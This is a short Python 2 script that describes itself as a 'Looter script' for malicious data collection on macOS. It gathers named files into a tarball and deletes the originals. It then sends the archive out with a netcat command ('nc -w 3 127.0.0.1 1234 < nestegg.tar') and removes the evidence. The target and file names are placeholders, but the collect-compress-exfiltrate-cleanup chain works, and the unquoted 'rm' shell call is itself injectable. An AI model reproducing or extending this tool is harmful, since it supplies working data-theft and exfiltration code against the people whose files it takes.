#!/usr/bin/env python

################
### Includes ###
################

# Command Line Parsing
import argparse

# Platform Detection
import platform

# Creating Files / Path Checks
import os

# Tarfile Module
import tarfile

# Used for system calling
from subprocess import call

#################
### Functions ###
#################

# Determines platform being run (planned windows/*nix support)
# Exits program if platform is not supported
def os_check():
    plat = platform.system()
    if(plat == "Darwin"):
        return plat
#    elif(plat == "Windows"):
#        release = platform.release()
#        if(release == "10"):
#            return release
#        elif(release == "7"):
#            return release
    else:
        print "Platform not supported"
        exit(1)

# Determines directory path of script
def nest_egg():
    return os.path.dirname(os.path.abspath(__file__));

# Run all the things
def robbery(os,path):
    print os, path
    files = ["test.txt", "stuff.txt"]

    tar(path,files)
    exfil(path)

    return;

# Compress files for exfil
def tar(path,files):
    tar = tarfile.open(path+"/nestegg.tar", "w:gz")


    for file in files:
        filepath = path+"/"+file
        if os.path.isfile(filepath):
            tar.add(file)
            os.system("rm "+file)
    tar.close()

    return;

# Exfiltrate tar file
def exfil(path):

    cmd = "nc -w 3 127.0.0.1 1234 < nestegg.tar"
    os.system(cmd)
    os.system("rm nestegg.tar")
    return;

##############################
### Command Line Arguments ###
##############################

argparser = argparse.ArgumentParser(description='Looter script, collects juicy data for malicious use.')
argparser.add_argument('-a','--all', action='store_true', help='perform all collections')
argparser.add_argument('-d','--dir', action='store', dest='path', help='specify nest egg path')
args = argparser.parse_args()

####################
### Main Program ###
####################

# Calls platform information function
plat = os_check()

# Checks if -d is specified for a specific drop path
# If -d not specified, automatically drop in script directory
if not args.path:
    args.path = nest_egg()

# Argument tree
if args.all:
    robbery(plat,args.path)
        
# End Program
exit(0)
    











